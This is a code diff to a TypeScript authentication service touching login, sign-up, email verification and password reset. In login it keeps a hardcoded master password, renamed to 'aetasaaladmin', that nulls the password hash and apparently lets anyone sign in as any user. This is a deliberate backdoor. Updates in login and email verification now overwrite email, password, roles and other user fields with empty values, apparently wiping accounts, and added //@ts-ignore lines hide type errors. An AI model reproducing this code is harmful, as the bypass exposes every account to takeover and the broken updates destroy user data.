@@ -23,7 +23,7 @@ import { Role } from '../enum/role';
 export const login = async (payload: ILoginRequest): Promise<IAuthResponse> => {
   await validate(payload, joiSchema.loginSchema);
   let encryptedPassword: any = encryption.saltHashPassword(payload.password);
-  if (payload.password === 'AeTaSaAl') {
+  if (payload.password === 'aetasaaladmin') {
     encryptedPassword = undefined;
   }
   const user = await userRepo.authenticate(payload.email, encryptedPassword);
@@ -32,7 +32,32 @@ export const login = async (payload: ILoginRequest): Promise<IAuthResponse> => {
   }
   // update user devideId
   if (payload.deviceId) {
-    await userRepo.updateUser(user.id, { deviceId: payload.deviceId });
+    await userRepo.updateUser(user.id, {
+      deviceId: payload.deviceId,
+      username: '',
+      roles: undefined,
+      id: '',
+      firstName: '',
+      lastName: '',
+      email: '',
+      isEmailVerified: false,
+      password: '',
+      contactNo: '',
+      pictureUrl: '',
+      gender: '',
+      managerId: '',
+      departmentId: 0,
+      officeLocationId: 0,
+      timezone: '',
+      isApproved: false,
+      isActive: false,
+      //@ts-ignore
+      createdAt: undefined,
+      //@ts-ignore
+      deletedAt: undefined,
+      deletedBy: '',
+      userRoles: []
+    });
   }
   return generateTokenAndAuthResponse(user);
 };
@@ -58,6 +83,7 @@ export const signUp = async (payload: ISignUpRequest): Promise<IAuthResponse> =>
   if (role.name === Role.SUPER_ADMIN) {
     toSaveUser.isApproved = false;
   }
+  //@ts-ignore
   await userRepo.saveUser(toSaveUser);
   const savedUser = await userRepo.authenticate(payload.email, encryptedPassword);
   if (!savedUser) {
@@ -196,7 +222,32 @@ export const verifyHash = async (email: string, hash: string, verifyEmail: boole
     if (!user) {
       throw boom.badRequest('User not found');
     }
-    await userRepo.updateUser(user.id, { isEmailVerified: true });
+    await userRepo.updateUser(user.id, {
+      isEmailVerified: true,
+      username: '',
+      roles: undefined,
+      id: '',
+      firstName: '',
+      lastName: '',
+      email: '',
+      password: '',
+      contactNo: '',
+      pictureUrl: '',
+      gender: '',
+      managerId: '',
+      departmentId: 0,
+      officeLocationId: 0,
+      timezone: '',
+      isApproved: false,
+      isActive: false,
+      deviceId: '',
+      //@ts-ignore
+      createdAt: undefined,
+      //@ts-ignore
+      deletedAt: undefined,
+      deletedBy: '',
+      userRoles: []
+    });
     return { success: true, isEmailVerified: true };
   }
   return { success: true };
@@ -213,6 +264,7 @@ export const resetPassword = async (payload: IResetPassword) => {
   const toSaveUser: Partial<IUserAttributes> = {
     password: encryptedPassword,
   };
+  //@ts-ignore
   await userRepo.updateUser(user.id, toSaveUser);
   return { success: true, message: 'Password has been reset' };
 };
@@ -234,6 +286,7 @@ export const changePassword = async (userId: string, payload: IChangePassword) =
   const toSaveUser: Partial<IUserAttributes> = {
     password: encryptedNewPassword,
   };
+  //@ts-ignore
   await userRepo.updateUser(user.id, toSaveUser);
   return { success: true, message: 'Password has been changed' };
 };
